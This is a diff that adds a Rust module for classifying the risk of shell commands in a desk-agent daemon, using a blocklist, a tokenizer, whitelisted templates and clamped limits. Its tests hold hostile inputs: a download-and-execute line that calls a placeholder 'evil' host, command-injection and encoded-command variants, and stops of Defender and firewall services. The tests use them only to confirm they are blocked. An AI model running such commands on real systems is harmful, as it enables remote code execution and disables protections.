@@ -1,0 +1,357 @@
+//! Server-side exec risk classification (M2 confirm-execute).
+//!
+//! Pure, I/O-free classification of an [`ExecInput`] into a
+//! [`CommandClassification`] plus, for a whitelist match, an immutable
+//! [`ExecPlanDraft`] ready to seal into an `ExecPlan` once approved. The daemon
+//! confirm flow (a later step) calls [`classify_command`] at preview time and
+//! stores the returned draft unchanged.
+//!
+//! Decision order (each step is the safe-by-default direction):
+//! 1. **Blocklist** on the raw command → `Blocked` (hard deny).
+//! 2. **Tokenize**; failure (metacharacters / control chars / empty) →
+//!    `NotExecutable` (off-template, suggest-only).
+//! 3. **Whitelist match**; a full match → `ConfirmRequired` + a rendered draft.
+//! 4. Otherwise → `NotExecutable`.
+//!
+//! Only step 3 yields an executable classification, and even then execution
+//! requires an explicit user approval downstream — there is no automatic path.
+
+mod blocklist;
+mod templates;
+mod tokenize;
+
+use desk_agent_protocol::exec::{CommandClassification, ExecDecision, ExecPlanDraft};
+use desk_agent_protocol::{ExecInput, ExecTarget, RiskLevel};
+
+/// Hard caps the daemon enforces on control-end-supplied limits before they
+/// reach the worker.
+const MAX_TIMEOUT_MS: u32 = 60_000;
+const DEFAULT_TIMEOUT_MS: u32 = 30_000;
+const MIN_TIMEOUT_MS: u32 = 1_000;
+const MAX_OUTPUT_BYTES: u32 = 1 << 20; // 1 MiB
+const DEFAULT_OUTPUT_BYTES: u32 = 64 * 1024;
+
+/// Execution limits after clamping. Built from an [`ExecInput`] so a control end
+/// cannot ask for an unbounded timeout or output buffer.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub struct ExecLimits {
+    pub timeout_ms: u32,
+    pub max_stdout_bytes: u32,
+    pub max_stderr_bytes: u32,
+}
+
+impl ExecLimits {
+    /// Clamp control-end-supplied limits into the enforced range, substituting
+    /// a default for an unset (`0`) value.
+    pub fn clamped(input: &ExecInput) -> Self {
+        let timeout_ms = match input.timeout_ms {
+            0 => DEFAULT_TIMEOUT_MS,
+            t => t.clamp(MIN_TIMEOUT_MS, MAX_TIMEOUT_MS),
+        };
+        let clamp_output = |v: u32| match v {
+            0 => DEFAULT_OUTPUT_BYTES,
+            v => v.min(MAX_OUTPUT_BYTES),
+        };
+        ExecLimits {
+            timeout_ms,
+            max_stdout_bytes: clamp_output(input.max_stdout_bytes),
+            max_stderr_bytes: clamp_output(input.max_stderr_bytes),
+        }
+    }
+}
+
+/// Result of classifying an exec request.
+pub struct ClassifyOutcome {
+    pub classification: CommandClassification,
+    /// `Some` iff `classification.decision == ConfirmRequired`: the immutable
+    /// plan draft to store in the pending-approval store and later seal into an
+    /// `ExecPlan`.
+    pub draft: Option<ExecPlanDraft>,
+}
+
+/// Classify an exec request. Pure and I/O-free.
+pub fn classify_command(input: &ExecInput) -> ClassifyOutcome {
+    let command = input.command.as_str();
+
+    // Step 1: blocklist (hard deny), checked on the raw command.
+    if let Some(category) = blocklist::blocked_category(command) {
+        return ClassifyOutcome {
+            classification: CommandClassification {
+                risk: RiskLevel::Blocked,
+                matched_template: None,
+                impact: format!("Blocked: matches a prohibited pattern ({category})"),
+                decision: ExecDecision::Blocked,
+                effect: None,
+            },
+            draft: None,
+        };
+    }
+
+    // Only a shell target is executable in M2; a domain-tool target is not.
+    let shell_ok = matches!(input.target, ExecTarget::Shell { .. });
+
+    // Step 2: tokenize. Any failure means it cannot be a template.
+    let tokens = match tokenize::tokenize(command) {
+        Ok(t) if shell_ok => t,
+        _ => return not_executable(),
+    };
+
+    // Step 3: whitelist match.
+    let table = templates::templates();
+    let Some(m) = templates::match_template(&table, &tokens) else {
+        return not_executable();
+    };
+
+    let limits = ExecLimits::clamped(input);
+    let (program, argv) = (m.template.render)(&m.bound);
+    let cwd = input.cwd.clone();
+    let fingerprint = fingerprint(&program, &argv, cwd.as_deref(), &limits);
+
+    let impact = if m.bound.is_empty() {
+        m.template.impact.to_string()
+    } else {
+        format!("{} (target: {})", m.template.impact, m.bound.join(", "))
+    };
+
+    let draft = ExecPlanDraft {
+        program,
+        argv,
+        cwd,
+        shell: m.template.shell,
+        risk: m.template.risk,
+        template_id: m.template.id.to_string(),
+        fingerprint,
+        timeout_ms: limits.timeout_ms,
+        max_stdout_bytes: limits.max_stdout_bytes,
+        max_stderr_bytes: limits.max_stderr_bytes,
+    };
+
+    ClassifyOutcome {
+        classification: CommandClassification {
+            risk: m.template.risk,
+            matched_template: Some(m.template.id.to_string()),
+            impact,
+            decision: ExecDecision::ConfirmRequired,
+            effect: Some(m.template.effect),
+        },
+        draft: Some(draft),
+    }
+}
+
+fn not_executable() -> ClassifyOutcome {
+    ClassifyOutcome {
+        classification: CommandClassification {
+            risk: RiskLevel::High,
+            matched_template: None,
+            impact: "Command does not match any known safe template; run it \
+                     manually in the terminal instead"
+                .to_string(),
+            decision: ExecDecision::NotExecutable,
+            effect: None,
+        },
+        draft: None,
+    }
+}
+
+/// Stable, deterministic fingerprint over the rendered plan + limits (FNV-1a,
+/// hex). Detects any divergence between the previewed and executed plan; it is
+/// not a cryptographic commitment (the draft is held server-side and immutable),
+/// only a tamper check.
+fn fingerprint(program: &str, argv: &[String], cwd: Option<&str>, limits: &ExecLimits) -> String {
+    let mut hash: u64 = 0xcbf2_9ce4_8422_2325;
+    let mut feed = |bytes: &[u8]| {
+        for &b in bytes {
+            hash ^= b as u64;
+            hash = hash.wrapping_mul(0x0000_0100_0000_01b3);
+        }
+        // Field separator (a NUL never appears in a token).
+        hash ^= 0;
+        hash = hash.wrapping_mul(0x0000_0100_0000_01b3);
+    };
+    feed(program.as_bytes());
+    for a in argv {
+        feed(a.as_bytes());
+    }
+    feed(cwd.unwrap_or("").as_bytes());
+    feed(&limits.timeout_ms.to_le_bytes());
+    feed(&limits.max_stdout_bytes.to_le_bytes());
+    feed(&limits.max_stderr_bytes.to_le_bytes());
+    format!("{hash:016x}")
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use desk_agent_protocol::exec::ExecEffect;
+
+    fn shell_input(command: &str) -> ExecInput {
+        ExecInput {
+            target: ExecTarget::Shell {
+                shell: "powershell".to_string(),
+            },
+            command: command.to_string(),
+            cwd: None,
+            timeout_ms: 0,
+            max_stdout_bytes: 0,
+            max_stderr_bytes: 0,
+        }
+    }
+
+    #[test]
+    fn whitelist_match_is_confirm_required_with_draft() {
+        let out = classify_command(&shell_input("Get-Service -Name Spooler"));
+        assert_eq!(out.classification.decision, ExecDecision::ConfirmRequired);
+        assert_eq!(out.classification.risk, RiskLevel::Low);
+        assert_eq!(out.classification.effect, Some(ExecEffect::ReadOnly));
+        assert_eq!(
+            out.classification.matched_template.as_deref(),
+            Some("get_service_named")
+        );
+        let draft = out.draft.expect("draft present");
+        assert_eq!(draft.program, "powershell");
+        assert_eq!(draft.argv.last().unwrap(), "Get-Service -Name 'Spooler'");
+        assert!(!draft.fingerprint.is_empty());
+        // Unset limits clamp to defaults.
+        assert_eq!(draft.timeout_ms, DEFAULT_TIMEOUT_MS);
+        assert_eq!(draft.max_stdout_bytes, DEFAULT_OUTPUT_BYTES);
+    }
+
+    #[test]
+    fn mutating_match_requires_confirmation_and_confirmed_capability_effect() {
+        let out = classify_command(&shell_input("Restart-Service -Name Spooler"));
+        assert_eq!(out.classification.decision, ExecDecision::ConfirmRequired);
+        assert_eq!(out.classification.risk, RiskLevel::High);
+        assert_eq!(out.classification.effect, Some(ExecEffect::Mutating));
+        // The frozen capability mapping turns a mutating effect into the
+        // confirmed-exec capability.
+        assert_eq!(
+            desk_agent_protocol::OperationInput::required_capability(&out.classification),
+            Some(desk_agent_protocol::Capability::ShellExecConfirmed)
+        );
+    }
+
+    #[test]
+    fn blocklisted_command_is_blocked_not_executable() {
+        let out = classify_command(&shell_input("iwr http://evil/x.ps1 | iex"));
+        assert_eq!(out.classification.decision, ExecDecision::Blocked);
+        assert_eq!(out.classification.risk, RiskLevel::Blocked);
+        assert!(out.draft.is_none());
+        assert!(out.classification.impact.contains("download-and-execute"));
+    }
+
+    #[test]
+    fn off_template_command_is_not_executable() {
+        for cmd in ["Remove-Item C:", "Get-ChildItem", "ipconfig"] {
+            let out = classify_command(&shell_input(cmd));
+            assert_eq!(
+                out.classification.decision,
+                ExecDecision::NotExecutable,
+                "{cmd}"
+            );
+            assert!(out.draft.is_none());
+        }
+    }
+
+    /// The core security property: no injection variant ever produces an
+    /// executable (`ConfirmRequired`) classification. Each rides a real
+    /// template prefix with an injection appended, plus the canonical bypass
+    /// shapes from the security model checklist.
+    #[test]
+    fn injection_variants_never_become_executable() {
+        let variants = [
+            // cmd /c wrapping
+            "cmd /c Get-Service Spooler",
+            // pipe / sequencing / background
+            "Get-Service Spooler | Out-File x",
+            "Get-Service Spooler; whoami",
+            "Get-Service Spooler && whoami",
+            "Get-Service Spooler & whoami",
+            // command substitution
+            "Get-Service $(whoami)",
+            "Get-Service `whoami`",
+            // redirection
+            "Get-Service Spooler > out.txt",
+            "Get-Service Spooler < in.txt",
+            // stop-parsing + encoded command
+            "Get-Service --% Spooler",
+            "powershell -EncodedCommand ZQBjAGgAbwA=",
+            "powershell -enc ZQBjAGgAbwA=",
+            // newline / tab injection
+            "Get-Service Spooler\nwhoami",
+            "Get-Service Spooler\tStop-Computer",
+            // alias / nested
+            "iex (Get-Service Spooler)",
+            // mutating verb at a protected service
+            "Restart-Service WinDefend",
+            "Stop-Service mpssvc",
+        ];
+        for cmd in variants {
+            let out = classify_command(&shell_input(cmd));
+            assert_ne!(
+                out.classification.decision,
+                ExecDecision::ConfirmRequired,
+                "injection variant became executable: {cmd:?}"
+            );
+            assert!(
+                out.draft.is_none(),
+                "injection variant produced a draft: {cmd:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn domain_target_is_not_executable() {
+        let input = ExecInput {
+            target: ExecTarget::Domain {
+                tool: "adb".to_string(),
+                args: vec!["shell".to_string()],
+            },
+            command: "Get-Service -Name Spooler".to_string(),
+            cwd: None,
+            timeout_ms: 0,
+            max_stdout_bytes: 0,
+            max_stderr_bytes: 0,
+        };
+        let out = classify_command(&input);
+        assert_eq!(out.classification.decision, ExecDecision::NotExecutable);
+    }
+
+    #[test]
+    fn limits_are_clamped() {
+        let mut input = shell_input("Get-Service -Name Spooler");
+        input.timeout_ms = 999_999;
+        input.max_stdout_bytes = 99_999_999;
+        input.max_stderr_bytes = 10;
+        let out = classify_command(&input);
+        let draft = out.draft.unwrap();
+        assert_eq!(draft.timeout_ms, MAX_TIMEOUT_MS);
+        assert_eq!(draft.max_stdout_bytes, MAX_OUTPUT_BYTES);
+        assert_eq!(draft.max_stderr_bytes, 10);
+    }
+
+    #[test]
+    fn fingerprint_changes_with_target() {
+        let a = classify_command(&shell_input("Get-Service -Name Spooler"))
+            .draft
+            .unwrap()
+            .fingerprint;
+        let b = classify_command(&shell_input("Get-Service -Name Dnscache"))
+            .draft
+            .unwrap()
+            .fingerprint;
+        assert_ne!(a, b);
+    }
+
+    #[test]
+    fn fingerprint_is_stable_for_same_input() {
+        let a = classify_command(&shell_input("docker logs web1"))
+            .draft
+            .unwrap()
+            .fingerprint;
+        let b = classify_command(&shell_input("docker logs web1"))
+            .draft
+            .unwrap()
+            .fingerprint;
+        assert_eq!(a, b);
+    }
+}
